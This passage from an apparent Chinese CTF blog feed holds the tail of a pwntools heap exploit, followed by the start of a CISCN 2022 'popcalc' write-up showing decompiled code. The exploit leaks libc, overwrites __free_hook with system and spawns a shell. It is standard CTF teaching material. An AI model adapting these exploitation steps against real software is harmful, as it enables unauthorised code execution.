&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(nums):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;X:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Y:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(y))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Code:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(code[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[1;35m [+] : &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(code[i])+&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[0m&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	x +=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x  == Xn:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start X:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start Y:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,fake*i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;X&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;X&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libc_base + &lt;span class=&#34;number&#34;&gt;0x3ed8e8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + &lt;span class=&#34;number&#34;&gt;0x04f420&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[1;35m [+] libc_base : &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_base)+&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[0m&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[1;35m [+] free_hook : &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(free_hook)+&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[0m&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[1;35m [+] system : &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system)+&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[0m&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=free_hook-&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x29&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x2a&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x2b&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(write(&lt;span class=&#34;number&#34;&gt;0x2d&lt;/span&gt;,key&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(malloc(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;))		&lt;span class=&#34;comment&#34;&gt;#origin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newcode.append(malloc(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;))		&lt;span class=&#34;comment&#34;&gt;#aimedn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;How many codes do you want to set? &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(newcode)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(newcode)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;X:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Y:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(y))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Code:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(newcode[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[1;35m [+] : &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(newcode[i])+&lt;span class=&#34;string&#34;&gt;&amp;quot;\033[0m&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	x +=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x  == Xn:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		y+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start X:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;brva 0x0139D&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;#set &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Start Y:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x1439&amp;#x27;)			# malloc printf(&amp;quot;you say&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaaaaa\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;+p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;备注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#备注&#34;&gt;#&lt;/a&gt; 备注：&lt;/h2&gt;
&lt;p&gt;因为博客环境搭建问题，不能上传图片和文件包，需要题目及 ida 的逆向文件的朋友，可联系 QQ3263367390&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/19/ciscn-2022-popcalc/</guid>
            <title>ciscn_2022_popcalc</title>
            <link>http://example.com/2022/06/19/ciscn-2022-popcalc/</link>
            <category>writeup</category>
            <pubDate>Sun, 19 Jun 2022 16:41:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn_2022-popcalc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn_2022-popcalc&#34;&gt;#&lt;/a&gt; CISCN_2022   popcalc&lt;/h1&gt;
&lt;p&gt;一道 vm 的题目。一开始出题人就搞活，之前也遇到过几次，这次也是稍微学到了。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-60h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-58h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; src[&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-50h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v9; &lt;span class=&#34;comment&#34;&gt;// [rsp+58h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v9 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)mmap((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&lt;span class=&#34;number&#34;&gt;0xDEAD0000&lt;/span&gt;LL, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_401286(src);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(dest, src, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; v6 / &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = *((_DWORD *)dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] + i) - &lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 &amp;lt;= &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      __asm &amp;#123; jmp     rax &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_4012FC(src);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//汇编代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000004014F&lt;/span&gt;1                 lea     rdx, unk_402010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000004014F&lt;/span&gt;8                 add     rax, rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000004014F&lt;/span&gt;B                 db      &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Eh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00000000004014F&lt;/span&gt;B                 jmp     rax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复之后的代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span 